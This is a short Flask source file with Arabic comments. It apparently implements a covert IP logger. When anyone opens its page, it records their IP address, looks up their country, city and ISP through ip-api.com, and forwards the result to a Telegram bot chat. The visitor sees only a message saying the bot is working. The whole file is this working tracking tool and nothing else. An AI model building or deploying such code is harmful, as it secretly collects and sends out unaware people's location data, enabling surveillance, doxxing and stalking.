import os
import requests
from flask import Flask, request

app = Flask(__name__)

# بيانات بوت تيليجرام
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# رابط إرسال الرسائل للبوت
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}")
        data = res.json()
        if data["status"] == "success":
            location = f"🌍 IP: {ip}\nالبلد: {data['country']}\nالمدينة: {data['city']}\nالمزود: {data['isp']}"
        else:
            location = f"📡 IP: {ip}\nلم يتم العثور على موقع."
        return location
    except Exception as e:
        return f"❌ فشل في جلب الموقع: {str(e)}"

def send_to_telegram(message):
    try:
        requests.post(TELEGRAM_API, data={
            "chat_id": CHAT_ID,
            "text": message
        })
    except:
        pass

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    message = get_location(ip)
    send_to_telegram(message)
    return "<h2>✅ البوت يعمل بنجاح</h2>"

if __name__ == '__main__':
    app.run()